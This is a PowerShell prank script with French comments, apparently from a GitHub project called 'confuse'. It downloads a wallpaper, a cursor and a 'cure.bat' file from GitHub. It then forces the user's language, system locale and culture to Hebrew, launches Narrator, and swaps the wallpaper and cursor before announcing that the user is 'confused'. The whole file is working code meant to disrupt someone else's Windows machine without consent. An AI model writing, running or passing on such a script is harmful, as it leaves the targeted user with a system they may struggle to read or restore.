# -------------------- CRÉER LE DOSSIER DANS LES DOCUMENTS DE L'UTILISATEUR --------------------
$UserDocumentsPath = [Environment]::GetFolderPath('MyDocuments')
$FolderPath = "$UserDocumentsPath\confused"

if (-not (Test-Path -Path $FolderPath)) {
    New-Item -ItemType Directory -Path $FolderPath
}

# -------------------- TÉLÉCHARGER L'IMAGE --------------------
$ImageUrl = "https://raw.githubusercontent.com/NonoTheLion/confuse/main/data/wallpaper.png"
$ImagePath = "$FolderPath\wallpaper.jpg"

Invoke-WebRequest -Uri $ImageUrl -OutFile $ImagePath

# -------------------- TÉLÉCHARGER LE CURSEUR --------------------
$CursorUrl = "https://raw.githubusercontent.com/NonoTheLion/confuse/main/data/cursor.cur"
$CursorPath = "$FolderPath\cursor.cur"

Invoke-WebRequest -Uri $CursorUrl -OutFile $CursorPath

# -------------------- TÉLÉCHARGER LE CURE --------------------
$CureUrl = "https://raw.githubusercontent.com/NonoTheLion/confuse/main/data/cure.bat"
$CurePath = "$FolderPath\cure.bat"

Invoke-WebRequest -Uri $CureUrl -OutFile $CurePath

# -------------------- CHANGER LA LANGUE EN HÉBREU --------------------
$LanguageTag = "he-IL"
$UserLanguageList = Get-WinUserLanguageList
$UserLanguageList.Add($LanguageTag)
Set-WinUserLanguageList $UserLanguageList -Force
Set-WinUILanguageOverride -Language $LanguageTag
Set-WinUserLanguageList $LanguageTag -Force
Set-WinSystemLocale $LanguageTag
Set-Culture $LanguageTag

# -------------------- ACTIVER LE NARRATEUR --------------------
Start-Process "C:\Windows\System32\Narrator.exe"

# -------------------- CHANGER LE FOND D'ÉCRAN --------------------
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $ImagePath, 3)

# -------------------- CHANGER LE CURSEUR --------------------
Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value $CursorPath
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,SystemParametersInfoA 0, 0, "", 0

# -------------------- FIN --------------------
Write-Host "La configuration est terminée ! Vous êtes maintenant complètement 'confus' !"
